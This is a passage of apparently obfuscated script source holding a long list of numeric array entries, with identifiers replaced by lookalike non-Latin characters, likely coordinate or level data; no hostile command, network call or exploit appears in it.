			[1, ⵠ[568], ΔⵠᐃⲆ, 154, 6, ΔⲆⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 152, ΔᐃΔⲆⲆ, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 153, 7, ΔⲆⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 153, ⵠΔⵠᐃⵠ, 1],
			[ⵠΔΔ, ⵠ[568], ᐃⲆΔⲆ, 153, 5, 1],
			[ΔΔΔ, ⵠ[568], 2, 152, 5, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 152, ⵠᐃΔⵠᐃ, ⵠⲆΔ],
			[1, ⵠ[568], 2, 152, ᐃⵠⵠᐃᐃ, 1],
			[1, ⵠ[568], 2, 151, 6, ⵠΔⲆ],
			[1, ⵠ[568], 2, 157, 5, 1],
			[ΔΔΔ, ⵠ[568], 1, 156, ΔΔᐃⲆ, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⵠΔ, 150, ΔⵠⲆⲆ, ⵠΔⲆ],
			[1, ⵠ[568], ΔΔⵠ, 149, ⵠⵠⲆⲆⵠ, 1],
			[1, ⵠ[568], ⵠⲆⲆ, 147, ΔᐃΔⲆⲆ, 1],
			[ΔΔΔ, ⵠ[568], 0, 146, ⵠᐃΔⵠ, 1],
			[1, ⵠ[568], 0, 144, 7, 1],
			[ᐃⲆᐃ, ⵠ[568], 0, 142, 5, Ⲇᐃⵠ],
			[ᐃᐃⵠ, ⵠ[568], 1, 147, ᐃⲆⲆⲆ, 1],
			[1, ⵠ[568], ⵠΔΔ, 145, Δᐃⵠⵠⵠ, Ⲇᐃⵠ],
			[ΔΔΔ, ⵠ[568], ⵠΔΔ, 144, 5, 1],
			[ⵠΔᐃ, ⵠ[568], 2, 148, 5, ⵠΔⲆ],
			[ΔΔΔ, ⵠ[568], 2, 149, ΔΔᐃⲆ, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 150, 6, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 150, ⵠⵠⲆⵠΔ, ⵠΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], ⲆⲆΔᐃ, 151, 8, ᐃᐃⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 150, 7, ⵠΔⲆ],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆⵠᐃ, 149, Δᐃⵠⵠⵠ, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆⲆΔᐃ, 148, ΔᐃΔⲆⲆ, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆⲆΔᐃ, 149, 6, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], 2, 148, 6, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 148, 7, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 147, 7, 1],
			[1, ⵠ[568], 2, 147, ᐃΔΔΔ, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 146, 6, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 146, 7, ⵠⲆΔ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 146, 8, ⵠⲆΔ],
			[1, ⵠ[568], 2, 145, 7, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆᐃᐃⲆ, 145, ⵠΔⵠᐃⵠ, ⵠΔᐃ],
			[1, ⵠ[568], 2, 145, ⵠᐃΔⵠ, 1],
			[1, ⵠ[568], 2, 144, 6, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 143, 5, 1],
			[1, ⵠ[568], 2, 143, ⵠᐃΔⵠᐃ, ⵠⲆΔ],
			[1, ⵠ[568], 2, 142, ⵠΔᐃΔⲆ, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 141, ΔΔᐃⲆ, ⵠΔⲆ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 224, 10, 1],
			[ᐃⲆᐃ, ⵠ[568], 0, 224, Ⲇᐃᐃᐃᐃ, 1],
			[1, ⵠ[568], 0, 224, 13, 1],
			[1, ⵠ[568], 0, 224, ⲆⲆⲆⵠⲆ, ⵠⲆΔ],
			[ⵠΔⲆ, ⵠ[568], ᐃⵠⲆ, 224, ⵠΔⵠⵠⵠ, ⵠⲆΔ],
			[1, ⵠ[568], ⵠⲆⲆ, 224, 22, ⵠⲆΔ],
			[1, ⵠ[568], 0, 224, 24, Ⲇᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], ΔⲆⲆ, 224, 29, ᐃᐃⵠ],
			[ⵠΔΔ, ⵠ[568], 0, 224, 33, ᐃᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], ⲆΔⵠ, 224, 35, 1],
			[1, ⵠ[568], 0, 224, 38, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⲆΔ, 224, 14, 1],
			[1, ⵠ[568], 1, 224, ᐃΔⲆⵠᐃ, ⵠⲆΔ],
			[1, ⵠ[568], ᐃᐃⵠ, 224, 27, ᐃᐃⵠ],
			[ⵠⲆΔ, ⵠ[568], Ⲇᐃⵠ, 224, 31, 1],
			[1, ⵠ[568], ᐃᐃⵠ, 224, 36, 1],
			[ΔΔΔ, ⵠ[568], ΔⵠᐃⲆ, 224, 12, ΔⲆⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 224, 15, 1],
			[1, ⵠ[568], 2, 224, 16, 1],
			[1, ⵠ[568], 2, 224, 18, ΔΔΔ],
			[1, ⵠ[568], 2, 224, 21, 1],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 224, 23, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆΔⲆ, 224, 25, ᐃᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆⵠᐃ, 224, 26, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 224, 28, ⵠΔᐃ],
			[ⵠΔᐃ, ⵠ[568], 2, 224, 30, ⵠΔⲆ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 224, 32, 1],
			[1, ⵠ[568], 2, 224, 34, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 224, 37, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 224, 39, 1],
			[1, ⵠ[568], ᐃⵠΔ, 224, 41, ΔⲆⵠ],
			[ⵠⲆΔ, ⵠ[568], 0, 224, 44, 1],
			[ⵠΔⲆ, ⵠ[568], 0, 224, 46, ᐃⲆᐃ],
			[1, ⵠ[568], 0, 224, 52, 1],
			[ΔⲆⵠ, ⵠ[568], 0, 224, 57, ⵠΔᐃ],
			[ᐃᐃⵠ, ⵠ[568], 1, 224, 47, ⵠΔΔ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 224, 40, ⵠΔⲆ],
			[ᐃᐃⵠ, ⵠ[568], ⲆᐃᐃⲆ, 224, 42, ΔΔΔ],
			[ⵠΔΔ, ⵠ[568], ⵠⵠΔⲆ, 224, 43, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆⲆΔᐃ, 224, 45, ⵠⲆΔ],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠΔⲆ, 224, 49, ⵠⲆΔ],
			[ᐃⲆᐃ, ⵠ[568], 1, 224, 50, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 224, 51, ΔΔΔ],
			[ⵠΔⲆ, ⵠ[156], 3, 224, 54, 1],
			[ⵠⲆΔ, ⵠ[568], ⵠⵠΔⲆ, 224, 56, ΔⲆⵠ],
			[ᐃᐃⵠ, ⵠ[568], 2, 224, 58, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⲆⲆΔᐃ, 224, 61, ⵠΔᐃ],
			[1, ⵠ[568], 0, 224, 60, ⵠΔΔ],
			[ⵠΔΔ, ⵠ[568], 0, 224, 64, Ⲇᐃⵠ],
			[1, ⵠ[568], ⲆΔⵠ, 224, 66, 1],
			[ᐃⲆᐃ, ⵠ[568], 0, 224, 70, ⵠΔᐃ],
			[1, ⵠ[568], ⵠⲆⲆ, 224, 74, 1],
			[ⵠⲆΔ, ⵠ[568], 0, 224, 77, ᐃᐃⵠ],
			[1, ⵠ[568], ⵠΔΔ, 224, 62, ΔⲆⵠ],
			[1, ⵠ[568], ⵠΔⲆ, 224, 68, 1],
			[1, ⵠ[568], ᐃⲆᐃ, 224, 72, 1],
			[1, ⵠ[568], ⵠΔΔ, 224, 76, ΔⲆⵠ],
			[1, ⵠ[568], 1, 224, 80, ⵠΔᐃ],
			[ΔΔΔ, ⵠ[568], ᐃⲆᐃ, 224, 83, 1],
			[ⵠⲆΔ, ⵠ[568], 1, 224, 91, ⵠΔΔ],
			[1, ⵠ[568], 1, 224, 95, ⵠΔᐃ],
			[ⵠΔᐃ, ⵠ[568], Ⲇᐃⵠ, 224, 97, ΔΔΔ],
			[1, ⵠ[568], Δⵠᐃ, 224, 85, ⵠΔΔ],
			[1, ⵠ[568], ᐃΔΔ, 224, 88, ⵠΔΔ],
			[ⵠΔΔ, ⵠ[568], 0, 224, 93, 1],
			[1, ⵠ[568], ᐃⵠΔ, 224, 98, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 224, 59, ⵠΔΔ],
			[1, ⵠ[568], 2, 224, 63, 1],
			[ΔΔΔ, ⵠ[568], 2, 224, 65, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 224, 67, ⵠΔⲆ],
			[ⵠΔΔ, ⵠ[568], ⵠⵠⵠΔ, 224, 69, 1],
			[ⵠΔᐃ, ⵠ[568], 2, 224, 71, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 224, 73, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 224, 75, ΔΔΔ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 224, 78, 1],
			[1, ⵠ[568], 2, 224, 79, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], ⵠⵠΔⲆ, 224, 81, 1],
			[ⵠΔΔ, ⵠ[568], ΔⵠᐃⲆ, 224, 82, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 224, 84, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 224, 86, ⵠΔⲆ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 224, 87, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 224, 89, 1],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆⵠᐃ, 224, 90, ΔⲆⵠ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 224, 92, 1],
			[ⵠⲆΔ, ⵠ[568], ΔⵠᐃⲆ, 224, 94, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 224, 96, ᐃᐃⵠ],
			[ᐃᐃⵠ, ⵠ[568], ΔⵠᐃⲆ, 224, 99, ᐃⲆᐃ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 224, 100, ⵠⲆΔ],
			[ᐃᐃⵠ, ⵠ[568], ⵠⲆⲆ, 224, 101, ⵠΔᐃ],
			[1, ⵠ[568], ⵠΔΔ, 224, 103, 1],
			[ⵠΔᐃ, ⵠ[568], 2, 224, 102, 1],
			[ΔⲆⵠ, ⵠ[568], 0, 222, 10, Ⲇᐃⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 223, ΔΔⵠⲆⵠ, 1],
			[1, ⵠ[568], 2, 222, ⲆΔⲆΔⵠ, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 221, ⵠⲆⲆΔᐃ, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 223, ᐃΔᐃΔⲆ, 1],
			[ⵠΔΔ, ⵠ[568], ⵠⵠⵠΔ, 223, ⲆⲆΔᐃᐃⲆⲆ, 1],
			[ΔΔΔ, ⵠ[568], 2, 223, ⲆΔⵠᐃⲆ, 1],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆΔⵠ, 223, ᐃⵠΔᐃΔΔⲆ, 1],
			[1, ⵠ[568], ⵠⵠⵠᐃ, 222, 11, 1],
			[1, ⵠ[568], 3, 220, ΔΔΔΔΔ, ⵠΔᐃ],
			[Ⲇᐃⵠ, ⵠ[568], 3, 219, ΔⲆⵠΔⲆ, ΔⲆⵠ],
			[ⵠΔΔ, ⵠ[568], ⲆᐃΔᐃ, 221, ᐃΔᐃΔⲆ, ⵠⲆΔ],
			[1, ⵠ[196], ΔⵠᐃⲆ, 219, ⵠΔΔⵠⲆ, 1],
			[ⵠΔᐃ, ⵠ[196], ⵠΔⲆ, 218, 18, ΔΔΔ],
			[1, ⵠ[196], ΔΔΔ, 214, 13, 1],
			[1, ⵠ[568], Δⵠᐃ, 221, 20, ⵠⲆΔ],
			[1, ⵠ[568], 1, 223, 18, ᐃᐃⵠ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 222, ⵠΔⵠⵠⵠ, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 223, 19, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 223, ᐃΔⲆⵠᐃ, ᐃⲆᐃ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 222, ΔΔⲆⵠᐃ, 1],
			[1, ⵠ[568], 2, 220, 21, 1],
			[ⵠΔⲆ, ⵠ[568], 0, 219, 21, 1],
			[ΔⲆⵠ, ⵠ[568], 3, 221, 21, 1],
			[1, ⵠ[568], ⲆᐃΔᐃ, 218, 21, 1],
			[1, ⵠ[568], 3, 222, 21, 1],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 220, 22, ⵠΔⲆ],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆΔⵠ, 219, 22, ⵠΔⲆ],
			[1, ⵠ[568], 3, 221, 22, 1],
			[ΔΔΔ, ⵠ[568], ᐃΔΔ, 211, 9, ⵠΔᐃ],
			[ⵠⲆΔ, ⵠ[568], 1, 211, 10, 1],
			[1, ⵠ[568], ⵠΔᐃ, 210, ΔΔΔᐃᐃⲆᐃ, ⵠΔᐃ],
			[1, ⵠ[568], ᐃΔΔ, 211, 13, ⵠΔΔ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 210, Ⲇᐃⵠⵠⵠ, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 210, ⲆⵠΔΔᐃ, ⵠⲆΔ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆⵠᐃ, 210, 11, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], ⲆⲆΔᐃ, 212, 9, 1],
			[1, ⵠ[568], 2, 210, 13, 1],
			[1, ⵠ[568], 2, 211, 12, 1],
			[ⵠⲆΔ, ⵠ[568], ⵠⵠⵠΔ, 211, Ⲇᐃᐃᐃᐃ, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 211, 14, 1],
			[1, ⵠ[568], 2, 212, ΔⲆᐃᐃⲆ, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ΔⵠᐃⲆ, 210, 14, 1],
			[ⵠΔⲆ, ⵠ[568], ΔⲆᐃⲆ, 211, ΔⲆΔⲆⲆ, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[568], ⲆᐃΔᐃ, 213, 9, ⵠΔΔ],
			[1, ⵠ[568], 3, 212, ⲆⵠΔΔᐃ, 1],
			[ᐃⲆᐃ, ⵠ[568], 3, 223, 21, 1],
			[ΔΔΔ, ⵠ[568], ⵠⵠⵠᐃ, 209, 9, 1],
			[Ⲇᐃⵠ, ⵠ[156], ᐃⲆᐃᐃ, 223, 22, Ⲇᐃⵠ],
			[ⵠⲆΔ, ⵠ[156], 3, 221, 23, ΔΔΔ],
			[ᐃᐃⵠ, ⵠ[156], ᐃᐃⲆⲆ, 207, ΔⵠᐃᐃⲆ, 1],
			[Ⲇᐃⵠ, ⵠ[156], ΔⲆᐃⲆ, 209, ⲆⵠΔΔᐃ, 1],
			[1, ⵠ[156], 0, 209, 12, ᐃᐃⵠ],
			[ⵠⲆΔ, ⵠ[156], 4, 209, ΔⵠⵠⲆⵠ, 1],
			[ⵠΔⲆ, ⵠ[156], 4, 219, 23, ΔΔΔ],
			[ΔⲆⵠ, ⵠ[156], ᐃⲆᐃᐃ, 210, 15, 1],
			[1, ⵠ[156], 3, 217, 22, 1],
			[1, ⵠ[156], 4, 212, ⵠᐃⵠⵠⲆ, ⵠΔᐃ],
			[1, ⵠ[156], 2, 214, 19, 1],
			[ⵠΔⲆ, ⵠ[156], 4, 213, 20, 1],
			[1, ⵠ[156], Ⲇᐃⵠ, 212, 21, 1],
			[1, ⵠ[156], 4, 215, 18, 1],
			[1, ⵠ[156], 2, 216, 17, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[156], ⵠᐃΔⵠ, 216, 16, 1],
			[ⵠΔⲆ, ⵠ[156], ⵠᐃΔⵠ, 216, 15, 1],
			[ⵠⲆΔ, ⵠ[156], 1, 217, 16, 1],
			[ⵠⲆΔ, ⵠ[156], ᐃⲆⵠᐃ, 218, ⵠᐃⵠⵠⲆ, 1],
			[1, ⵠ[156], 2, 216, ᐃΔᐃⲆⲆ, ⵠΔᐃ],
			[ᐃⲆᐃ, ⵠ[156], ⵠⵠⵠΔ, 219, ΔΔᐃᐃΔ, 1],
			[1, ⵠ[156], 5, 220, 16, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[156], 5, 216, ᐃⵠΔᐃΔΔⲆ, ᐃⲆᐃ],
			[ⵠΔᐃ, ⵠ[156], ⲆⲆⲆΔ, 217, 15, ᐃⲆᐃ],
			[1, ⵠ[568], 0, 211, 44, ΔΔΔ],
			[1, ⵠ[568], ⵠΔᐃ, 212, 45, 1],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆⵠᐃ, 213, 45, 1],
			[1, ⵠ[568], ᐃⵠⲆ, 214, 46, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠⵠΔⲆ, 215, 46, ΔΔΔ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆΔⵠ, 213, 46, 1],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 214, 47, ΔΔΔ],
			[1, ⵠ[568], 3, 214, 48, ⵠΔᐃ],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 216, 46, 1],
			[1, ⵠ[568], 0, 208, ⵠⵠⵠⲆᐃ, 1],
			[ᐃⲆᐃ, ⵠ[568], 0, 210, 21, 1],
			[ⵠΔΔ, ⵠ[568], Δⵠᐃ, 212, 23, 1],
			[ⵠⲆΔ, ⵠ[568], ⲆΔⵠ, 213, 25, ΔⲆⵠ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 213, 24, ⵠΔᐃ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 211, 22, Ⲇᐃⵠ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 210, ⵠΔΔⲆⲆ, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 209, 21, ΔⲆⵠ],
			[ᐃⲆᐃ, ⵠ[568], ⲆⲆΔᐃ, 209, 20, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 211, 21, ⵠΔΔ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 212, 22, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 213, 23, 1],
			[1, ⵠ[568], ᐃⲆᐃᐃ, 213, 26, ⵠΔⲆ],
			[ΔⲆⵠ, ⵠ[568], 3, 207, 20, ⵠΔΔ],
			[1, ⵠ[156], ⵠᐃΔΔ, 192, 33, ⵠΔᐃ],
			[1, ⵠ[156], Ⲇⵠⵠⵠ, 191, 34, ⵠΔΔ],
			[1, ⵠ[156], ⲆΔⵠᐃ, 190, 35, Ⲇᐃⵠ],
			[1, ⵠ[156], ᐃᐃⲆⲆ, 189, 37, ⵠΔΔ],
			[ⵠⲆΔ, ⵠ[156], 3, 188, 39, 1],
			[ⵠΔⲆ, ⵠ[156], Ⲇⵠⵠⵠ, 186, 40, ΔΔΔ],
			[1, ⵠ[156], 4, 185, 39, 1],
			[ⵠΔᐃ, ⵠ[156], 4, 184, 39, 1],
			[Ⲇᐃⵠ, ⵠ[156], 2, 183, 39, 1],
			[ᐃⲆᐃ, ⵠ[156], ΔΔΔ, 182, 40, ΔΔΔ],
			[ⵠΔΔ, ⵠ[156], 2, 181, 41, 1],
			[1, ⵠ[156], ⵠⵠΔΔ, 180, 41, ⵠⲆΔ],
			[1, ⵠ[156], ⲆΔΔᐃ, 179, 41, 1],
			[ᐃⲆᐃ, ⵠ[156], ᐃⵠⵠΔ, 192, 28, ⵠΔⲆ],
			[1, ⵠ[156], ⵠᐃᐃⲆ, 191, 28, ⵠΔᐃ],
			[ⵠⲆΔ, ⵠ[156], 4, 190, 27, ΔΔΔ],
			[ⵠⲆΔ, ⵠ[156], 3, 188, 27, ΔΔΔ],
			[1, ⵠ[156], 4, 187, 26, ⵠΔᐃ],
			[1, ⵠ[156], ⵠΔᐃΔ, 186, 25, 1],
			[ᐃⲆᐃ, ⵠ[156], ⵠᐃᐃⲆ, 185, 25, Ⲇᐃⵠ],
			[1, ⵠ[156], 4, 184, 24, Ⲇᐃⵠ],
			[1, ⵠ[156], 5, 184, 23, ᐃⲆᐃ],
			[ⵠΔᐃ, ⵠ[156], 2, 184, 22, 1],
			[1, ⵠ[156], 5, 184, 21, ⵠΔᐃ],
			[ΔΔΔ, ⵠ[156], 1, 183, ⵠᐃΔᐃᐃ, 1],
			[1, ⵠ[156], 5, 182, ΔΔⲆⵠᐃ, ᐃᐃⵠ],
			[1, ⵠ[156], ᐃⲆⵠᐃ, 181, 20, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[156], ⲆΔΔᐃ, 180, 20, ⵠΔⲆ],
			[ⵠⲆΔ, ⵠ[156], ⵠⵠⵠΔ, 179, 20, ⵠΔΔ],
			[ΔⲆⵠ, ⵠ[156], ⲆⵠΔⵠ, 178, 19, ᐃⲆᐃ],
			[ᐃᐃⵠ, ⵠ[156], 3, 178, 17, 1],
			[ᐃᐃⵠ, ⵠ[156], ⵠⵠⵠᐃ, 176, 18, Ⲇᐃⵠ],
			[1, ⵠ[568], ᐃⵠΔ, 177, 15, ⵠⲆΔ],
			[1, ⵠ[568], 0, 175, ΔⲆⲆΔΔ, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃΔΔ, 180, ΔᐃᐃΔⵠ, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ⵠⲆⲆ, 174, 19, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], ΔΔⵠ, 172, ᐃΔⲆⵠᐃ, 1],
			[1, ⵠ[568], 1, 175, ΔⲆᐃᐃⲆ, Ⲇᐃⵠ],
			[1, ⵠ[568], ⵠΔΔ, 172, ᐃⵠⲆΔΔ, ⵠΔᐃ],
			[1, ⵠ[568], 1, 181, 15, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 179, 15, ᐃⲆᐃ],
			[Ⲇᐃⵠ, ⵠ[568], ⲆᐃᐃⲆ, 177, 16, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 176, ⲆⲆⲆΔΔ, ΔΔΔ],
			[1, ⵠ[568], 2, 174, ⲆⵠⵠⲆⲆ, Ⲇᐃⵠ],
			[ΔΔΔ, ⵠ[568], ᐃⲆΔⲆ, 173, ⲆⲆⵠΔⵠ, ΔⲆⵠ],
			[ⵠΔᐃ, ⵠ[568], 2, 172, ᐃΔⲆΔⵠ, ΔⲆⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 173, ⲆⵠΔⵠⵠ, ᐃᐃⵠ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 173, 17, 1],
			[ΔΔΔ, ⵠ[568], 2, 174, 17, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 174, 16, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 175, 16, ΔⲆⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 176, 15, ⵠΔⲆ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 178, ⵠⵠΔⵠᐃ, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 178, ΔΔᐃᐃΔ, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 179, 16, 1],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠΔⲆ, 180, 15, ᐃⲆᐃ],
			[ᐃᐃⵠ, ⵠ[568], ⲆⲆΔᐃ, 181, 16, 1],
			[ⵠΔᐃ, ⵠ[568], 3, 182, 16, 1],
			[ⵠⲆΔ, ⵠ[568], 3, 172, 21, ⵠΔΔ],
			[Ⲇᐃⵠ, ⵠ[156], ΔⲆⵠ, 175, 19, 1],
			[1, ⵠ[156], 2, 174, 20, 1],
			[1, ⵠ[156], ⵠⵠΔⲆ, 173, 20, ⵠⲆΔ],
			[ᐃᐃⵠ, ⵠ[156], Ⲇᐃⵠ, 180, 17, 1],
			[1, ⵠ[156], ᐃⲆⵠᐃ, 181, ΔΔⲆΔᐃᐃᐃ, 1],
			[ⵠΔᐃ, ⵠ[156], 3, 191, ΔΔⲆⵠᐃ, 1],
			[ΔⲆⵠ, "s", ᐃⵠΔ, 217, 30, ᐃⲆᐃ],
			[Ⲇᐃⵠ, "s", ᐃΔΔ, 208, 35, ΔΔΔ],
			[ⵠⲆΔ, "s", 0, 204, 24, 1],
			[1, "s", 1, 218, 32, 1],
			[1, "s", 1, 207, 34, ⵠΔᐃ],
			[ⵠΔⲆ, "s", ⵠΔⲆ, 202, 23, 1],
			[1, "s", 1, 195, 16, 1],
			[ⵠⲆΔ, "s", 2, 222, 28, Ⲇᐃⵠ],
			[1, "s", ᐃⲆⵠᐃ, 212, 38, ΔΔΔ],
			[1, "s", 2, 207, 23, ⵠΔΔ],
			[ⵠⲆΔ, "s", 2, 202, 12, 1],
			[ⵠΔᐃ, "s", ⵠⵠΔⲆ, 195, 18, 1],
			[ⵠⲆΔ, "s", ΔⲆⵠ, 191, ⲆΔⵠᐃⲆ, 1],
			[ⵠΔᐃ, "s", ⲆΔⵠ, 187, ΔⵠΔᐃᐃ, ⵠΔΔ],
			[ⵠⲆΔ, "s", ᐃⲆⵠᐃ, 188, ΔᐃᐃΔⵠ, ᐃⲆᐃ],
			[1, "s", ⵠΔⲆ, 186, 14, 1],
			[ⵠΔⲆ, "s", ⵠΔⲆ, 201, ΔΔᐃᐃⲆ, 1],
			[Ⲇᐃⵠ, "g", 1, 216, 31, 1],
			[1, "g", 0, 200, ΔⲆΔⲆⲆ, 1],
			[ΔⲆⵠ, "g", 0, 202, 40, 1],
			[ⵠΔΔ, "g", ᐃⵠⲆ, 189, 32, 1],
			[Ⲇᐃⵠ, "g", 0, 204, 28, 1],
			[ΔⲆⵠ, "g", ᐃΔΔ, 196, 24, 1],
			[1, "g", ᐃⲆΔⲆ, 198, 37, 1],
			[Ⲇᐃⵠ, "s", ᐃΔΔ, 193, 39, ᐃⲆᐃ],
			[1, "s", ΔⲆⲆ, 201, 45, 1],
			[1, "a", 0, 210, 29, ᐃᐃⵠ],
			[1, "a", 0, 200, 20, ⵠΔᐃ],
			[1, ⵠ[568], ⲆΔⵠ, 200, 34, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[568], 0, 193, 27, 1],
			[1, ⵠ[568], ⵠΔΔ, 203, 30, ⵠΔΔ],
			[ⵠΔΔ, ⵠ[568], 1, 191, 31, ⵠΔᐃ],
			[ΔⲆⵠ, ⵠ[568], 2, 202, 32, Ⲇᐃⵠ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 194, 26, ⵠⲆΔ],
			[1, ⵠ[568], 2, 192, 27, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 192, 32, ⵠΔⲆ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆΔⲆ, 203, 31, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 202, 31, 1],
			[1, ⵠ[568], 2, 202, 30, Ⲇᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], ΔⲆᐃⲆ, 202, 29, ᐃⲆᐃ],
			[1, ⵠ[568], 3, 201, 32, 1],
			[1, ⵠ[568], ⲆΔⵠⵠ, 199, 35, 1],
			[1, ⵠ[568], ΔΔⵠ, 193, 34, ⵠΔⲆ],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆⵠᐃ, 194, 34, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ⲆⲆΔᐃ, 198, 35, 1],
			[1, ⵠ[568], 3, 199, 34, 1],
			[ⵠΔᐃ, ⵠ[568], 3, 191, 29, 1],
			[1, ⵠ[568], ᐃⵠΔ, 191, 30, 1],
			[ΔΔΔ, ⵠ[568], ΔⲆΔᐃ, 190, 29, ΔΔΔ],
			[ⵠΔᐃ, ⵠ[156], ᐃⲆᐃᐃ, 180, 69, 1],
			[1, ⵠ[156], 3, 182, 68, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[156], 3, 184, 68, ᐃⲆᐃ],
			[Ⲇᐃⵠ, ⵠ[156], 3, 186, 70, Ⲇᐃⵠ],
			[1, ⵠ[156], 3, 184, 72, 1],
			[1, ⵠ[156], 3, 182, 72, ᐃᐃⵠ],
			[1, ⵠ[156], ⲆᐃΔᐃ, 180, 71, 1],
			[ⵠΔᐃ, ⵠ[568], ᐃⵠΔ, 186, 68, ⵠΔⲆ],
			[1, ⵠ[568], 0, 187, 70, ᐃⲆᐃ],
			[ⵠΔᐃ, ⵠ[568], ⲆΔⵠ, 183, 74, ⵠΔⲆ],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⲆⲆ, 178, 70, ⵠⲆΔ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 182, 66, ⵠΔᐃ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 182, 74, ⵠΔΔ],
